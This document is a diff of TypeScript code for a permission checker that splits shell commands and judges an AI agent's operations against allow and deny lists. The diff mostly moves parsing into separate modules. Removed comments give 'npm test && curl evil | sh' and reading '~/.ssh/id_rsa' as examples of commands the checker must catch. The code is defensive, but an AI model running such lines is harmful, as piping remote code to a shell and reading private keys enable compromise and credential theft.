@@ -1,395 +1,10 @@
-import { basename, relative, resolve, sep } from "node:path";
 import type { Decider, DecisionContext } from "../extension.ts";
-import type { Decision, Operation, SearchFilter } from "../types.ts";
+import type { Decision, Operation } from "../types.ts";
 import { parsePatterns, type Pattern } from "./match.ts";
-import { shellSplit } from "../providers/codex/shell.ts";
-import { sedObjection } from "./sed.ts";
-import { gitIgnored } from "./ignored.ts";
-import { compileFilter, type Candidate } from "./filter.ts";
-import { isWithin } from "../core/paths.ts";
-import { recursiveReadOf } from "./recursive.ts";
-import { REACH_LIMIT, reachableFiles } from "../core/reach.ts";
-import { realpathSync, statSync } from "node:fs";
+import { REACH_LIMIT } from "../core/reach.ts";
+import { analyseOperation, type OperationAnalysis } from "./analysis.ts";
 
-/** One segment of a command line, in the forms a rule may be matched against. */
-export interface CommandSegment {
-  /** The unquoted words, as the shell would pass them. */
-  words: string[];
-  /** Index in `words` of the program that actually runs, once wrappers are stripped. */
-  programIndex: number;
-  /** The words joined — what allow and deny rules see first. */
-  text: string;
-  /** `text` with wrappers and shell keywords removed: `env curl x` → `curl x`. */
-  unwrapped: string;
-  /** `unwrapped` with the program reduced to its name: `/usr/bin/curl x` → `curl x`. */
-  named: string;
-  /** The program gets its arguments from stdin (`xargs`), so what runs has more words than we see. */
-  fed: boolean;
-}
-
-/**
- * A command line is judged one segment at a time.
- *
- * `npm test && curl evil | sh` is not "npm test": it is three commands, and every one
- * of them must pass. Split on the shell operators, then refuse outright anything that
- * hides a command inside another — `$(…)`, backticks — or turns a read into a write
- * with a redirect, or changes what a command does without changing its name — a
- * variable expansion, an environment assignment, a glob the shell would expand.
- * Those cannot be judged by matching text, so they are not allowed. What is left is
- * unquoted before matching, so `cat ~/".ssh"/id_"rsa"` is judged as what it opens.
- *
- * This is the one parser. Containment and the decider both read from it, so what
- * one refuses the other cannot let through.
- */
-export function parseCommand(command: string): {
-  segments: CommandSegment[];
-  unjudgeable: string | null;
-} {
-  const trimmed = command.trim();
-  const scanned = scan(trimmed);
-  if (scanned.unjudgeable) return { segments: [], unjudgeable: scanned.unjudgeable };
-  const segments: CommandSegment[] = [];
-  for (const raw of scanned.segments) {
-    const assignment = leadingAssignment(raw);
-    if (assignment.refused)
-      return {
-        segments: [],
-        unjudgeable: `an environment assignment (${assignment.refused})`,
-      };
-    const words = shellSplit(assignment.rest);
-    if (!words.length) continue;
-    const inner = unwrap(words);
-    if (inner.refused) return { segments: [], unjudgeable: inner.refused };
-    const programIndex = words.length - inner.words.length;
-    const namedWords = inner.words.length
-      ? [basename(inner.words[0]!), ...inner.words.slice(1)]
-      : [];
-    // `/usr/bin/env curl` → `env curl` → `curl`: naming the program can expose a wrapper.
-    const renamed = unwrap(namedWords);
-    segments.push({
-      words,
-      programIndex,
-      text: words.join(" "),
-      unwrapped: inner.words.join(" "),
-      named: (renamed.refused ? namedWords : renamed.words).join(" "),
-      fed: inner.fed,
-    });
-  }
-  if (!segments.length)
-    segments.push({
-      words: [trimmed],
-      programIndex: 0,
-      text: trimmed,
-      unwrapped: trimmed,
-      named: trimmed,
-      fed: false,
-    });
-  return { segments, unjudgeable: null };
-}
-
-/** Shell keywords that may precede a command inside a compound. */
-const KEYWORDS = new Set([
-  "if",
-  "then",
-  "else",
-  "elif",
-  "while",
-  "until",
-  "do",
-  "!",
-  "{",
-  "}",
-]);
-/** Wrappers that run their argument unchanged and take no options we can judge. */
-const PLAIN_WRAPPERS = new Set([
-  "exec",
-  "builtin",
-  "nohup",
-  "time",
-  "setsid",
-  "unbuffer",
-]);
-const XARGS_WITH_VALUE = new Set([
-  "-n",
-  "-I",
-  "-P",
-  "-L",
-  "-s",
-  "-d",
-  "-E",
-  "-a",
-  "-J",
-  "-R",
-  "-S",
-  "--max-args",
-  "--replace",
-  "--max-procs",
-  "--max-lines",
-  "--delimiter",
-  "--arg-file",
-  "--max-chars",
-  "--eof",
-]);
-
-/**
- * Strip the wrappers a shell puts in front of the command that actually runs, so a
- * deny rule for `curl` also sees `env curl`, `nohup curl`, `xargs curl`. Options that
- * would change what runs (`env -S`, `nohup -p`) are refused: a rule cannot judge them.
- */
-function unwrap(input: readonly string[]): {
-  words: string[];
-  refused: string | null;
-  fed: boolean;
-} {
-  let words = [...input];
-  let fed = false;
-  for (let guard = 0; guard < 8 && words.length; guard++) {
-    const head = words[0]!;
-    if (KEYWORDS.has(head)) {
-      words.shift();
-      continue;
-    }
-    if (head === "env") {
-      words.shift();
-      if (words[0]?.startsWith("-")) return { words, refused: "options to env", fed };
-      while (/^[A-Za-z_][A-Za-z0-9_]*=/.test(words[0] ?? "")) {
-        const name = words[0]!.slice(0, words[0]!.indexOf("="));
-        if (!HARMLESS_ASSIGNMENT.test(name))
-          return { words, refused: `an environment assignment (${name})`, fed };
-        words.shift();
-      }
-      continue;
-    }
-    if (head === "command") {
-      // `command -v x` asks where x lives; it runs nothing.
-      if (words[1] === "-v" || words[1] === "-V") break;
-      words.shift();
-      if (words[0] === "-p") words.shift();
-      continue;
-    }
-    if (PLAIN_WRAPPERS.has(head)) {
-      words.shift();
-      if (words[0]?.startsWith("-"))
-        return { words, refused: `options to ${head}`, fed };
-      continue;
-    }
-    if (head === "nice") {
-      words.shift();
-      if (words[0] === "-n") words.splice(0, 2);
-      else if (/^-\d+$|^--adjustment=/.test(words[0] ?? "")) words.shift();
-      continue;
-    }
-    if (head === "timeout") {
-      words.shift();
-      while (words[0]?.startsWith("-")) {
-        if (words[0] === "-k" || words[0] === "-s") words.splice(0, 2);
-        else words.shift();
-      }
-      words.shift(); // the duration
-      continue;
-    }
-    if (head === "stdbuf") {
-      words.shift();
-      while (words[0]?.startsWith("-")) words.shift();
-      continue;
-    }
-    if (head === "xargs") {
-      words.shift();
-      fed = true;
-      while (words[0]?.startsWith("-")) {
-        const flag = words.shift()!;
-        if (XARGS_WITH_VALUE.has(flag)) words.shift();
-      }
-      continue;
-    }
-    break;
-  }
-  return { words, refused: null, fed };
-}
-
-/**
- * One pass over the line with the shell's quoting rules: inside single quotes
- * everything is literal; inside double quotes `$` and backticks still expand; outside
- * quotes operators split segments and globs expand. Whatever the shell would
- * interpret and the rule cannot see is reported, and the first reason wins.
- */
-function scan(line: string): { segments: string[]; unjudgeable: string | null } {
-  const segments: string[] = [];
-  let current = "";
-  let quote: "'" | '"' | null = null;
-  const push = () => {
-    if (current.trim()) segments.push(current.trim());
-    current = "";
-  };
-  // A `$` that expands: anything but a bare `$` before whitespace, the end, or a closing quote.
-  const expands = (next: string, closing: string) =>
-    next !== "" && next !== closing && !/\s/.test(next);
-  for (let index = 0; index < line.length; index++) {
-    const char = line[index]!;
-    const next = line[index + 1] ?? "";
-    if (quote === "'") {
-      if (char === "'") quote = null;
-      current += char;
-      continue;
-    }
-    if (quote === '"') {
-      if (char === "\\" && next === "\n") {
-        index++; // line continuation
-        continue;
-      }
-      if (char === "\\") {
-        current += char + next;
-        index++;
-        continue;
-      }
-      if (char === "`" || (char === "$" && next === "("))
-        return { segments, unjudgeable: "command substitution" };
-      if (char === "$" && expands(next, '"'))
-        return { segments, unjudgeable: "variable expansion" };
-      if (char === '"') quote = null;
-      current += char;
-      continue;
-    }
-    // outside quotes
-    const wordStart = current === "" || /[\s=]$/.test(current);
-    if (char === "\\" && next === "\n") {
-      index++; // line continuation
-      continue;
-    }
-    if (char === "\\") {
-      current += char + next;
-      index++;
-      continue;
-    }
-    if (char === "'" || char === '"') {
-      quote = char;
-      current += char;
-      continue;
-    }
-    if (
-      char === "`" ||
-      (char === "$" && next === "(") ||
-      (char === "<" && next === "(")
-    )
-      return { segments, unjudgeable: "command substitution" };
-    if (char === "(" || char === ")") {
-      // A subshell runs what is inside it; judge that as its own segment.
-      push();
-      continue;
-    }
-    if (char === "$" && expands(next, ""))
-      return { segments, unjudgeable: "variable expansion" };
-    if (char === "~" && wordStart && next !== "" && next !== "/" && !/\s/.test(next))
-      return { segments, unjudgeable: "tilde expansion" };
-    if (char === "{") {
-      // `{a,b}` and `{1..3}` expand to several words; a bare `{}` (find -exec) does not.
-      const close = line.indexOf("}", index);
-      const inside = close === -1 ? "" : line.slice(index + 1, close);
-      if (inside.includes(",") || inside.includes(".."))
-        return { segments, unjudgeable: "brace expansion" };
-    }
-    if (char === ">") {
-      // `2>/dev/null` and `2>&1` discard or merge output; they cannot write a file.
-      const harmless = /^(?:>\s*\/dev\/null|>&[0-9])(?=$|[\s;&|])/.exec(
-        line.slice(index),
-      );
-      if (!harmless) return { segments, unjudgeable: "output redirect" };
-      current = current.replace(/(^|\s)[0-9]$/, "$1"); // the fd number belongs to the redirect
-      index += harmless[0].length - 1;
-      continue;
-    }
-    if (char === "*" || char === "?" || char === "[")
-      return { segments, unjudgeable: `a shell glob (${char})` };
-    if (char === "\n" || char === "\r" || char === ";") {
-      push();
-      if (char === ";" && next === ";") index++;
-      continue;
-    }
-    if (char === "|") {
-      push();
-      if (next === "|" || next === "&") index++;
-      continue;
-    }
-    if (char === "&") {
-      if (next === ">") return { segments, unjudgeable: "output redirect" };
-      if (/^&[0-9]/.test(line.slice(index)))
-        return { segments, unjudgeable: "output redirect" }; // a stray >&2 form
-      push();
-      if (next === "&") index++;
-      continue;
-    }
-    current += char;
-  }
-  if (quote) return { segments, unjudgeable: "unbalanced quotes" };
-  push();
-  return { segments, unjudgeable: null };
-}
-
-/**
- * `CI=1 npm test` is still `npm test`; `NODE_OPTIONS=--require=x tsc` is not.
- * Only assignments that cannot change what a command does are stripped; any other
- * leading assignment refuses the segment.
- */
-const HARMLESS_ASSIGNMENT =
-  /^(?:CI|NODE_ENV|FORCE_COLOR|NO_COLOR|TZ|LANG|LC_ALL|DEBUG|TERM|COLUMNS)$/;
-function leadingAssignment(segment: string): { rest: string; refused: string | null } {
-  let rest = segment;
-  for (;;) {
-    const match = /^([A-Za-z_][A-Za-z0-9_]*)=(\S*)\s+/.exec(rest);
-    if (!match) return { rest, refused: null };
-    if (!HARMLESS_ASSIGNMENT.test(match[1]!)) return { rest, refused: match[1]! };
-    rest = rest.slice(match[0].length);
-  }
-}
-
-/** The values a rule is matched against, per operation kind. */
-/**
- * A reached file described the way a search tool's globs see it: its name, its path
- * from the tool's working directory, and the directories between the search root and
- * it (which an excluded directory name prunes).
- */
-function candidate(file: string, searchRoot: string, cwd: string): Candidate {
-  const realRoot = safeReal(searchRoot);
-  const realCwd = safeReal(cwd);
-  const fromCwd = isWithin(file, realCwd)
-    ? relative(realCwd, file).split(sep).join("/")
-    : null;
-  const between = isWithin(file, realRoot)
-    ? relative(realRoot, file).split(sep)
-    : [basename(file)];
-  // The search root may itself sit below the working directory: those leading parts belong to every dir's path.
-  const fromCwdParts = fromCwd?.split("/") ?? [];
-  const lead = fromCwdParts.length - between.length;
-  const dirs = between.slice(0, -1).map((name, index) => ({
-    name,
-    rel: fromCwd === null ? null : fromCwdParts.slice(0, lead + index + 1).join("/"),
-  }));
-  return { name: basename(file), fromCwd, dirs };
-}
-
-function safeReal(path: string): string {
-  try {
-    return realpathSync.native(path);
-  } catch {
-    return resolve(path);
-  }
-}
-
-function isDirectory(path: string): boolean {
-  try {
-    return statSync(path).isDirectory();
-  } catch {
-    return false;
-  }
-}
-
-/** A path as the rules see it: relative to the workspace, forward slashes. */
-function relativise(workspaceRoot: string, path: string): string {
-  const full = resolve(workspaceRoot, path);
-  const inside = relative(workspaceRoot, full);
-  // Paths outside the workspace are rejected before we get here, but be explicit.
-  return inside === "" ? "." : inside.split(sep).join("/");
-}
+export { parseCommand, type CommandSegment } from "./command.ts";
 
 /**
  * One thing a rule is matched against, in every form that means the same thing.
@@ -404,33 +19,19 @@ interface Subject {
 
 const plain = (value: string): Subject => ({ deny: [value], allow: [value] });
 
-function subjects(operation: Operation, workspaceRoot: string): Subject[] {
-  switch (operation.kind) {
+function subjects(analysis: OperationAnalysis): Subject[] {
+  switch (analysis.kind) {
     case "read":
-      return operation.paths.map((path) => plain(relativise(workspaceRoot, path)));
     case "write":
-      return operation.changes.map((change) =>
-        plain(relativise(workspaceRoot, change.path)),
-      );
+      return analysis.paths.map(plain);
     case "exec":
-      return parseCommand(operation.command).segments.map((segment) => ({
-        // A program fed by xargs runs with words we cannot see; `curl *` must still see it.
-        deny: [
-          ...new Set([
-            segment.text,
-            segment.unwrapped,
-            segment.named,
-            ...(segment.fed
-              ? [`${segment.unwrapped} <stdin>`, `${segment.named} <stdin>`]
-              : []),
-          ]),
-        ],
-        allow: [...new Set([segment.text, segment.unwrapped])],
+      return analysis.segments.map((segment) => ({
+        deny: segment.denyForms,
+        allow: segment.allowForms,
       }));
     case "net":
-      return [plain(operation.host ?? operation.url ?? "*")];
     case "tool":
-      return [plain(`${operation.server}/${operation.tool}`)];
+      return [plain(analysis.subject ?? "*")];
   }
 }
 
@@ -510,95 +111,20 @@ export class BuiltinDecider implements Decider {
     this.reachLimit = options.reachLimit ?? REACH_LIMIT;
   }
 
-  /**
-   * A search over a directory is judged by every file it can reach. A reached file the
-   * deny list names refuses the search — unless the tool honours .gitignore and git
-   * says the file is ignored, because then the tool never opens it. Everything reached
-   * joins the subjects, so the allow list must cover it too.
-   */
-  private async reach(
-    dirs: readonly string[],
-    search: {
-      hidden: boolean;
-      follow: boolean;
-      respectsIgnore: boolean;
-      filter?: SearchFilter;
-      cwd: string;
-    },
-    root: string,
-  ): Promise<{
-    refused: Decision | null;
-    reached: Array<{ where: string; subjects: Subject[] }>;
-  }> {
-    const reached: Array<{ where: string; subjects: Subject[] }> = [];
-    for (const dir of dirs) {
-      if (!isDirectory(dir)) continue;
-      const reach = reachableFiles(dir, root, {
-        hidden: search.hidden,
-        follow: search.follow,
-        limit: this.reachLimit,
-      });
-      const where = relativise(root, dir);
-      const refuse = (
-        reason: string,
-        rule?: string,
-      ): { refused: Decision; reached: [] } => ({
-        refused: { verdict: "deny", reason, ...(rule ? { rule } : {}) },
-        reached: [],
-      });
-      if (reach.truncated)
-        return refuse(
-          `Refused: a search over ${where} reaches too many files to judge (more than ${this.reachLimit}). Search a narrower path.`,
-        );
-      if (reach.outside)
-        return refuse(
-          `Refused: a search over ${where} would follow ${relativise(root, reach.outside)} out of the workspace.`,
-        );
-      // Files the tool would never open — outside its globs or types — cannot be reached by it.
-      const keep = search.filter ? compileFilter(search.filter) : null;
-      const opened = keep
-        ? reach.files.filter((file) => keep(candidate(file, dir, search.cwd)))
-        : reach.files;
-      const named = opened.map((file) => [file, relativise(root, file)] as const);
-      const denied = named.filter(([, relativePath]) =>
-        firstMatch(this.deny, "read", [relativePath]),
-      );
-      const ignored =
-        denied.length && search.respectsIgnore
-          ? await gitIgnored(
-              root,
-              denied.map(([file]) => file),
-            )
-          : new Set<string>();
-      const first = denied.find(([file]) => !ignored.has(file));
-      if (first) {
-        const rule = firstMatch(this.deny, "read", [first[1]])!;
-        return refuse(
-          `Refused by the deny list (${rule.source}): a search over ${where} reaches ${first[1]}. Search a narrower path.`,
-          rule.source,
-        );
-      }
-      reached.push({
-        where,
-        subjects: named
-          .filter(([file]) => !ignored.has(file))
-          .map(([, relativePath]) => plain(relativePath)),
-      });
-    }
-    return { refused: null, reached };
-  }
-
   async decide(operation: Operation, context: DecisionContext): Promise<Decision> {
-    if (operation.kind === "exec") {
-      const { unjudgeable } = parseCommand(operation.command);
-      if (unjudgeable)
-        return {
-          verdict: "deny",
-          reason: `Refused: the command uses ${unjudgeable}, which cannot be judged by a rule. Run it as separate plain commands.`,
-        };
-    }
+    const analysis = await analyseOperation(operation, {
+      workspaceRoot: context.workspaceRoot,
+      reachLimit: this.reachLimit,
+      suspect: (path) => !!firstMatch(this.deny, "read", [path]),
+    });
 
-    const values = subjects(operation, context.workspaceRoot);
+    if (analysis.unjudgeable)
+      return {
+        verdict: "deny",
+        reason: `Refused: the command uses ${analysis.unjudgeable}, which cannot be judged by a rule. Run it as separate plain commands.`,
+      };
+
+    const values = subjects(analysis);
 
     // An operation that declares nothing cannot be judged, and [].every() is true.
     if (values.length === 0) {
@@ -610,60 +136,37 @@ export class BuiltinDecider implements Decider {
         };
     }
 
-    // Claude's Grep runs `rg --hidden`: dotfiles too, symlinks not followed, .gitignore honoured.
-    if (operation.kind === "read" && operation.recursive) {
-      const { refused, reached } = await this.reach(
-        operation.paths,
-        {
-          hidden: true,
-          follow: false,
-          respectsIgnore: true,
-          filter: operation.filter,
-          cwd: context.workspaceRoot,
-        },
-        context.workspaceRoot,
-      );
-      if (refused) return refused;
-      // The search reads the files, not the directory entry: the allow list must cover those.
-      for (const { where, subjects: files } of reached) {
-        if (!files.length) continue;
-        const own = values.findIndex((subject) => subject.allow[0] === where);
+    // A search over a directory is judged by every file it can reach. A reached file
+    // the deny list names refuses the search; for a read, everything reached joins the
+    // subjects, so the allow list must cover it too.
+    for (const search of analysis.searches) {
+      if (search.refused) return { verdict: "deny", reason: search.refused };
+      const rule = firstMatch(this.deny, "read", search.files);
+      if (rule) {
+        const file = search.files.find((path) => rule.test(path));
+        return {
+          verdict: "deny",
+          reason: `Refused by the deny list (${rule.source}): a search over ${search.where} reaches ${file}. Search a narrower path.`,
+          rule: rule.source,
+        };
+      }
+      if (operation.kind === "read" && search.files.length) {
+        // The search reads the files, not the directory entry: the allow list must cover those.
+        const own = values.findIndex((subject) => subject.allow[0] === search.where);
         if (own >= 0) values.splice(own, 1);
-        values.push(...files);
+        values.push(...search.files.map(plain));
       }
     }
 
-    // `grep -r`, `rg`, `diff -r`: a command that searches a directory reaches what is in it.
-    if (operation.kind === "exec")
-      for (const segment of parseCommand(operation.command).segments) {
-        const search = recursiveReadOf(
-          segment.words.slice(segment.programIndex),
-          operation.cwd,
-        );
-        if (!search) continue;
-        const { refused } = await this.reach(
-          search.dirs,
-          { ...search, cwd: operation.cwd },
-          context.workspaceRoot,
-        );
-        if (refused) return refused;
-      }
-
-    if (operation.kind === "exec") {
-      // A command that names a file is a read of that file, whatever the file is called
-      // on the command line: containment resolved the names to what is on disk.
-      if (operation.paths?.length) {
-        const named = operation.paths.map((path) =>
-          relativise(context.workspaceRoot, path),
-        );
-        const denied = firstMatch(this.deny, "read", named);
-        if (denied)
-          return {
-            verdict: "deny",
-            reason: `Refused by the deny list (${denied.source}): the command reads ${named.find((path) => denied.test(path))}.`,
-            rule: denied.source,
-          };
-      }
+    // A command that names a file reads it, whatever the file is called on the line.
+    if (analysis.namedPaths.length) {
+      const denied = firstMatch(this.deny, "read", analysis.namedPaths);
+      if (denied)
+        return {
+          verdict: "deny",
+          reason: `Refused by the deny list (${denied.source}): the command reads ${analysis.namedPaths.find((path) => denied.test(path))}.`,
+          rule: denied.source,
+        };
     }
 
     // Deny first, and a single denied path — or command segment — refuses the whole operation.
@@ -676,17 +179,12 @@ export class BuiltinDecider implements Decider {
       };
 
     // sed is allowed for reading, so its script must be one that only reads.
-    if (operation.kind === "exec")
-      for (const segment of parseCommand(operation.command).segments) {
-        const program = segment.words.slice(segment.programIndex);
-        if (!["sed", "gsed"].includes(basename(program[0] ?? ""))) continue;
-        const objection = sedObjection(program);
-        if (objection)
-          return {
-            verdict: "deny",
-            reason: `Refused: only sed scripts that print or filter are allowed (${objection}). Use -n or -E with p, d, s/…/…/ and addresses; w, r, e, -i and -f cannot be judged by a rule.`,
-          };
-      }
+    for (const segment of analysis.segments)
+      if (segment.sedObjection)
+        return {
+          verdict: "deny",
+          reason: `Refused: only sed scripts that print or filter are allowed (${segment.sedObjection}). Use -n or -E with p, d, s/…/…/ and addresses; w, r, e, -i and -f cannot be judged by a rule.`,
+        };
 
     // Every path in a multi-file change, and every segment of a command, must be allowed.
     if (everySubjectMatches(this.allow, operation.kind, values)) {
